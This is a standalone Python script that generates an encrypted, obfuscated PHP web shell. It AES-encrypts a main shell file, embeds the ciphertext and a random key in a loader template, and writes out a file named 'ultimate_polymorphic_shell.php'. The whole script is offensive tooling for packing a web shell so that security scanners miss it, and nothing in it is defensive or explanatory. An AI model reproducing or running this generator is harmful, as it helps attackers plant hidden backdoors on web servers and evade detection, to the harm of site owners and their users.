#!/usr/bin/env python3
import os
import base64
import secrets
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def encrypt_shell(shell_content, key):
    """Encrypt the shell content using AES-256-CBC with SHA256 hash of key"""
    # Generate IV from the key
    iv = hashlib.md5(key.encode()).digest()[:16]
    
    # Hash the key (as we found Method 4 works)
    key_hash = hashlib.sha256(key.encode()).digest()
    
    # Pad the content
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(shell_content.encode()) + padder.finalize()
    
    # Encrypt the content
    cipher = Cipher(
        algorithms.AES(key_hash), 
        modes.CBC(iv),
        backend=default_backend()
    )
    encryptor = cipher.encryptor()
    encrypted_content = encryptor.update(padded_data) + encryptor.finalize()
    
    # Return base64 encoded encrypted content
    return base64.b64encode(encrypted_content).decode()

def generate_shell(main_shell_path, loader_template_path, output_path):
    """Generate the final shell with encrypted payload"""
    # Generate a random key
    key = secrets.token_hex(8)
    
    # Read the main shell content
    with open(main_shell_path, 'r') as f:
        main_shell = f.read()
    
    # Read the loader template
    with open(loader_template_path, 'r') as f:
        loader_template = f.read()
    
    # Encrypt the main shell
    encrypted_shell = encrypt_shell(main_shell, key)
    
    # Replace placeholders in the loader template
    final_loader = loader_template.replace('$key = "my_secret_key"', f'$key = "{key}"')
    final_loader = final_loader.replace('$payload = "ENCRYPTED_PAYLOAD_PLACEHOLDER"', f'$payload = "{encrypted_shell}"')
    
    # Write the final shell to the output path
    with open(output_path, 'w') as f:
        f.write(final_loader)
    
    print(f"Shell generated successfully at {output_path}")
    print(f"Key: {key}")
    print(f"Size: {os.path.getsize(output_path)} bytes")

if __name__ == "__main__":
    # Paths
    main_shell_path = "main_shell.php"
    loader_template_path = "shell_loader.php"
    output_path = "ultimate_polymorphic_shell.php"
    
    # Generate the shell
    generate_shell(main_shell_path, loader_template_path, output_path)
